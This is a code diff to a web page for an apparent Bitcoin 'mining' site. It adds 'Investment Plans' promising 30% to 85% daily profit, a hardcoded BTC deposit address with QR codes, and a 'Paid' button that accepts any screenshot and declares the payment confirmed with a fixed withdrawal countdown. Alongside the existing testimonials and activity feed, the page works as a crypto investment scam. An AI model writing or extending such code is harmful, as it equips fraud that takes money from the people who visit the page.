@@ -24,6 +24,10 @@ canvas{width:100%;height:140px;background:#0b0f1a;border-radius:8px;}
 #topbar{display:none;position:fixed;top:0;left:0;right:0;background:#10162b;padding:10px;z-index:1000;display:flex;justify-content:space-between;}
 #menu{display:none;position:fixed;top:50px;right:10px;background:var(--card);padding:10px;border-radius:10px;}
 #menu div{padding:8px;cursor:pointer;}
+.plan{border:1px solid #222;padding:15px;border-radius:10px;margin-top:10px;text-align:center;}
+.pay-section{display:none;margin-top:10px;}
+.screenshot-img{max-width:100%;margin-top:10px;border-radius:8px;border:1px solid #222;}
+.countdown{color:var(--accent);font-weight:bold;margin-top:5px;}
 </style>
 </head>
 
@@ -55,6 +59,9 @@ canvas{width:100%;height:140px;background:#0b0f1a;border-radius:8px;}
 <h2>BTC Deposit Address</h2>
 <div class="btc-box" id="btcAddress">bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav</div>
 <button onclick="copyAddress()">Copy Address</button>
+<div style="text-align:center;margin-top:10px;">
+  <img src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav" style="border-radius:8px;">
+</div>
 </div>
 
 <div class="card">
@@ -72,6 +79,10 @@ canvas{width:100%;height:140px;background:#0b0f1a;border-radius:8px;}
 <h2>Recent Activity</h2>
 <div class="tx-container" id="txs"></div>
 </div>
+
+<!-- Investment Plans -->
+<h2>Investment Plans</h2>
+<div class="card" id="plansContainer"></div>
 
 <div class="card">
 <h2>Live Testimonials</h2>
@@ -98,7 +109,6 @@ canvas{width:100%;height:140px;background:#0b0f1a;border-radius:8px;}
 const menuBtn=document.getElementById('menuBtn');
 const menu=document.getElementById('menu');
 menuBtn.onclick=()=>menu.style.display=menu.style.display==='block'?'none':'block';
-
 function showSection(id){
   document.querySelectorAll('#withdrawals,#support').forEach(e=>e.classList.add('hidden'));
   document.getElementById(id).classList.remove('hidden');
@@ -112,20 +122,18 @@ function registerUser(){
   localStorage.setItem('registeredUser',contact);
   enterDashboard(contact);
 }
-
 function enterDashboard(user){
   document.getElementById('loginCard').style.display='none';
   document.getElementById('dashboard').classList.remove('hidden');
   document.getElementById('topbar').style.display='flex';
   document.getElementById('usernameDisplay').innerText=user;
   startMining();
+  initPlans();
 }
-
 function logout(){
   localStorage.removeItem('registeredUser');
   location.reload();
 }
-
 /* AUTO ENTER */
 const savedUser=localStorage.getItem('registeredUser');
 if(savedUser){enterDashboard(savedUser);}
@@ -190,7 +198,59 @@ setInterval(()=>{
   feed.prepend(d);
 },2500);
 }
+
+/* INVESTMENT PLANS */
+function initPlans(){
+const plans=[
+  {name:'Plan A',profit:'30%',min:200,max:599},
+  {name:'Plan B',profit:'45%',min:600,max:1000},
+  {name:'Plan C',profit:'60%',min:1100,max:2000},
+  {name:'Plan D',profit:'75%',min:2000,max:4999},
+  {name:'Plan E',profit:'80%',min:5000,max:9999},
+  {name:'Plan F',profit:'85%',min:10000,max:'Unlimited'}
+];
+const container=document.getElementById('plansContainer');
+container.innerHTML='';
+plans.forEach((p,i)=>{
+  const div=document.createElement('div');
+  div.className='plan';
+  div.innerHTML=`
+    <h3>${p.name}</h3>
+    <p>Daily Profit: ${p.profit}</p>
+    <p>Min: $${p.min}</p>
+    <p>Max: $${p.max}</p>
+
+    <div class="pay-section" id="pay${i}">
+      <p>Send BTC to:</p>
+      <div class="btc-box">bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav</div>
+      <div style="text-align:center;margin-top:5px;">
+        <img src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav" style="border-radius:8px;">
+      </div>
+      <input type="file" id="screenshot${i}">
+      <button onclick="confirmPayment(${i})" style="margin-top:5px;">Paid</button>
+      <img id="preview${i}" class="screenshot-img" style="display:none">
+      <p class="countdown" id="countdown${i}">Withdrawal available in 3d 0h 0m 0s</p>
+    </div>
+
+    <button onclick="showPay(${i})" style="margin-top:8px;">Invest Now</button>
+  `;
+  container.appendChild(div);
+});
+}
+function showPay(i){document.getElementById('pay'+i).style.display='block';}
+function confirmPayment(i){
+  const file=document.getElementById('screenshot'+i).files[0];
+  if(!file){alert('Upload screenshot');return;}
+  const reader=new FileReader();
+  reader.onload=function(e){
+    const img=document.getElementById('preview'+i);
+    img.src=e.target.result;
+    img.style.display='block';
+    alert('Payment confirmed! Withdrawal countdown started.');
+  };
+  reader.readAsDataURL(file);
+}
 </script>
 
 </body>
-</html>
+  </html>
